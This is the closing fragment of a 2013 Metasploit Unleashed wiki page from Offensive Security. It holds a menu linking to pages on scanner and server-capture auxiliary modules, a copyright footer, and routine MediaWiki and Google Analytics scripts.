                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
                                                                </ul>
								                                <div class="clear"></div>
                                                        </li>
                                                        <li>Server
                                                                <ul class="two">
                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
                                                                </ul>
					                                			<div class="clear"></div>
                                                        </li>
                                                </ul>
                                        </div>
                                </li>
			<br />
			<br />
			<br />
			<br />
			</ul>
													</div>
				
					<div class="clear"></div>
				</div>

				<div id="footer">
					<div id="footer-content">
						<div class="left">
							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
						</div>
						<div class="right">
							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
						</div>
						<div class="clear"></div>
					</div>
				</div>
			
		</div>
<script>if(window.mw){
mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
}</script>
<script>if(window.mw){
mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
}</script>
<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-1981501-1");
pageTracker._trackPageview();
</script><!-- Served in 0.135 secs. --></body></html>